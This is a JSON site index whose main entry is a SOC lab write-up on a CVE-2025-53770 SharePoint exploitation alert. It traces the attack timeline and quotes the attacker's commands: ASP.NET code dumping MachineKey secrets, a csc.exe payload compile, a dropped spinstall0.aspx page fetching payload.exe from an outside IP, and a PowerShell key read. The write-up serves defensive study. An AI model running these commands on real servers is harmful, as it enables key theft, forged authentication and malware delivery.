[{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rCVE‑2025‑53770 #\rSource: SANS\r, CISA\r, LOLBAS\rWhat is the vulnerability? #\rCVE‑2025‑53770 | SharePoint vulnerability The vulnerability affects on-prem instances (2016, 2019, Subscription editions). It bypasses authentication by sending a header request to ToolPane.aspx, where the referrer is set to SignOut.aspx. Post-exploitation involves writing a payload to spinstall0.aspx which extracts cryptographic key material.\nWhat is the alert? #\rAlert Trigger Reason: Suspicious unauthenticated POST request targeting ToolPane.aspx with large payload size and spoofed referer indicative of CVE-2025-53770 exploitation.\nIt looks like the exploitation has been successful. We can see an unauthenticated POST request against ToolPane.aspx, and Signout.aspx in the referrer header. A large payload size to note here.\nSource IP Address: 107.191.58.76\nThis IP looks to be associated with the vulnerability, in the wild. Summary #\rWe have a true positive exploit of CVE‑2025‑53770. The adversary has successfully exploited the vulnerability and post-exploitation phase is evident.\nw3wp.exe was used to spawn an encoded powershell script. This script facilitates the extract of the ASP.NET MachineKey. LOTL was observed, with csc.exe being used to compile a malicious payload.exe. A SharePoint page spinstall0.aspx was created which loads the malicious payload.\nAnalysing the endpoint #\rOS: Windows Server 2019\nWe are vulnerable. Timeline #\rThe adversary begins by sending a crafted unauthenticated payload (Code 1) via POST. The server executes the payload via powershell, triggered by w3wp.exe (IIS process).\nProcesses\nTime Process Overview Child Process 13:07:11 w3wp.exe Process that supports SharePoint powershell.exe 13:07:24 powershell.exe Run Base64 code (Code 1). csc.exe 13:07:27 csc.exe Compile payload.cs as payload.exe (Code 2) cmd.exe 13:07:29 cmd.exe Write malicious spinstall0.aspx to SharePoint (Code 3) powershell.exe 13:07:34 powershell.exe Gather machine key (Code 4) Terminal History #\rCode 1 #\rFlags: -nop, -w hidden, -e\nNo profile Hide the PowerShell window EncodedCommand After decoding the Base64 commands we get: On page load, the script is set to execute.\nWe can gather the following:\n%@ Import Namespace=\u0026#34;System.Diagnostics\u0026#34; % %@ Import Namespace=\u0026#34;System.IO\u0026#34; % script runat=\u0026#34;server\u0026#34; language=\u0026#34;c#\u0026#34; C# execution ASP.NET var mkt = sy.GetType(\u0026#34;System.Web.Configuration.MachineKeySection\u0026#34;); Response.Write(cg.ValidationKey+\u0026#34;|\u0026#34;+cg.Validation+\u0026#34;|\u0026#34;+cg.DecryptionKey+\u0026#34;|\u0026#34;+cg.Decryption+\u0026#34;|\u0026#34;+cg.CompatibilityMode); Gathers and outputs machine keys from Web.Configuration ValidationKey DecryptionKey These crypto keys are used to authenticate user sessions Now the adversary can forge valid auth. tokens Code 2 #\r\u0026#34;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\u0026#34; /out:C:\\Windows\\Temp\\payload.exe C:\\Windows\\Temp\\payload.cs csc.exe is a binary file used by .NET to compile C#, this is a LOTL Malicious code payload.cs is compiled as payload.exe Code 3 #\r\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; /c echo \u0026lt;form runat=\\\u0026#34;server\\\u0026#34;\u0026gt; \u0026lt;object classid=\\\u0026#34;clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\\\u0026#34;\u0026gt;\u0026lt;param name=\\\u0026#34;Command\\\u0026#34; value=\\\u0026#34;Redirect\\\u0026#34;\u0026gt; \u0026lt;param name=\\\u0026#34;Button\\\u0026#34; value=\\\u0026#34;Test\\\u0026#34;\u0026gt; \u0026lt;param name=\\\u0026#34;Url\\\u0026#34; value=\\\u0026#34;http://107.191.58.76/payload.exe\\\u0026#34;\u0026gt;\u0026lt;/object\u0026gt;\u0026lt;/form\u0026gt; \u0026gt; C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx` Run command via cmd Drop redirector page spinstall0.aspx to SharePoint Layouts directory This triggers a redirect to download payload.exe from the adversary\u0026rsquo;s infrastructure Code 4 #\r\u0026#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34; -Command \u0026#34;[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()\u0026#34; Use Powershell to gather Machine Key ","date":"26 July 2025","externalUrl":null,"permalink":"/labs/cve202553770-sharepoint/","section":"Labs","summary":"A look at a SOC alert for CVE‑2025‑53770 SharePoint","title":"CVE‑2025‑53770 SharePoint","type":"labs"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/categories/labs/","section":"Categories","summary":"","title":"Labs","type":"categories"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/labs/","section":"Labs","summary":"","title":"Labs","type":"labs"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/categories/letsdefend/","section":"Categories","summary":"","title":"LetsDefend","type":"categories"},{"content":"","date":"26 July 2025","externalUrl":null,"permalink":"/categories/soc-labs/","section":"Categories","summary":"","title":"SOC Labs","type":"categories"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]